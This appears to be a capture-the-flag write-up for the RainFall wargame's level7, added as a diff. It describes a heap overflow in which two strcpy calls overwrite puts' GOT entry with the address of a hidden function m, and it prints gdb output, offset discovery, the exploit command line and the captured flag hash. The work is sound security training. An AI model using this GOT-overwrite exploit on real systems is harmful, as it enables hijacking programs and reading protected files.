@@ -1,0 +1,48 @@
+In this exercise, we have a sequence of 4 malloc then 2 strcpy.
+Examine it well and after some test, we understand that it is two structures.
+And that in each structure we have a string, in which have copy argv 1 and 2.
+And for finish we have a fopen with this path "/home/user/level8/.pass" follow by a fgets
+in "c" variable. And a puts , but don't print c variable.
+
+With objdump we find an other function, "m" with printf of c variable.
+
+In summary we need to find a way to exploit the heap, with the arguments for call m function.
+
+Let's look at how structures are allocated.
+
+ -----------------------------------------------------------------------------------------------------------
+ | s1 ( Name, Char Pointer ) | Paddings and Other Stuff | s2 ( Name, Char Pointer ) |  Name (8) |  Name (8) |
+ ------------------------------------------------------------------------------------------------------------
+
+With the first strcpy, we need to overwrite char pointer of s2 with GOT table adress.
+Like that with the second strcpy, we will not copy on the string of s2 but on the GOT table (puts function),
+and give a function m adress.
+
+So we need adress of m = 
+(gdb) p &m
+$1 = (<text variable, no debug info> *) 0x80484f4 <m> = \xf4\x84\x04\x08
+
+And adress of puts = 
+(gdb) p &puts
+$2 = (<text variable, no debug info> *) 0x8048400 <puts@plt>
+(gdb) disass 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+
+0x8049928 = \x28\x99\x04\x08
+
+We need to find the limit for overflow de second structure so we send a long string
+like this: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+And with dmesg we have the info for the segfault: 
+[ 9396.506192] level7[3120]: segfault at 37614136 ip b7eb8f52 sp bffff6bc error 6 in libc-2.15.so[b7e2c000+1a3000]
+
+37614136 = 36 41 61 37 =  6 A a 7 = So the 20th character.
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1643286266
+
